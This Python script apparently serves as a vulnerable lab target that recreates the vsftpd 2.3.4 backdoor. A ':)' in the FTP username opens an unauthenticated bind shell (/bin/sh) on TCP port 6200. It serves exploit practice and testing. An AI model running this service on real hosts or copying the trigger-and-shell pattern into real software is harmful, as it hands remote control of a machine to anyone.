#!/usr/bin/env python3
"""Minimal FTP-banner service reproducing the vsftpd 2.3.4 backdoor.

Historical note: in July 2011 the vsftpd-2.3.4.tar.gz source tarball
distributed from the project's own download site was trojaned. Any FTP
login whose *username* contained the two-character smiley ":)" caused
the backdoored binary to fork a shell bound to TCP 6200. This is a
from-scratch reimplementation of exactly that network-observable
behavior (banner, USER/PASS handling, and the 6200 trigger) - not a
rebuild of the original trojaned binary - so the real Metasploit module
(exploit/unix/ftp/vsftpd_234_backdoor) works against it unchanged.
"""
import socket
import subprocess
import threading

FTP_PORT = 21
BACKDOOR_PORT = 6200
BANNER = b"220 (vsFTPd 2.3.4)\r\n"

_backdoor_lock = threading.Lock()
_backdoor_started = False


def start_backdoor_listener():
    global _backdoor_started
    with _backdoor_lock:
        if _backdoor_started:
            return
        _backdoor_started = True
    threading.Thread(target=_backdoor_listener, daemon=True).start()


def _backdoor_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", BACKDOOR_PORT))
    srv.listen(5)
    print(f"[backdoor] triggered - listening on {BACKDOOR_PORT}")
    while True:
        conn, addr = srv.accept()
        print(f"[backdoor] connection from {addr}, spawning shell")
        # No "-i": the socket isn't a tty, and "-i" makes sh print a tty
        # warning + prompt that confuses tools expecting a plain pipe
        # (confirmed against the real Metasploit module's own freshness
        # check, which misread that banner as "already exploited").
        subprocess.Popen(["/bin/sh"], stdin=conn, stdout=conn, stderr=conn)


def handle_client(conn, addr):
    try:
        conn.sendall(BANNER)
        buf = b""
        while True:
            data = conn.recv(1024)
            if not data:
                break
            buf += data
            while b"\n" in buf:
                line, _, buf = buf.partition(b"\n")
                line = line.strip(b"\r\n")
                if not line:
                    continue
                cmd = line.decode(errors="replace")
                upper = cmd.upper()
                if upper.startswith("USER"):
                    if ":)" in cmd:
                        print(f"[ftp] backdoor trigger seen from {addr}")
                        start_backdoor_listener()
                    conn.sendall(b"331 Please specify the password.\r\n")
                elif upper.startswith("PASS"):
                    conn.sendall(b"230 Login successful.\r\n")
                elif upper.startswith("QUIT"):
                    conn.sendall(b"221 Goodbye.\r\n")
                    return
                else:
                    conn.sendall(b"500 Unknown command.\r\n")
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        conn.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", FTP_PORT))
    srv.listen(20)
    print(f"[ftp] listening on {FTP_PORT}")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
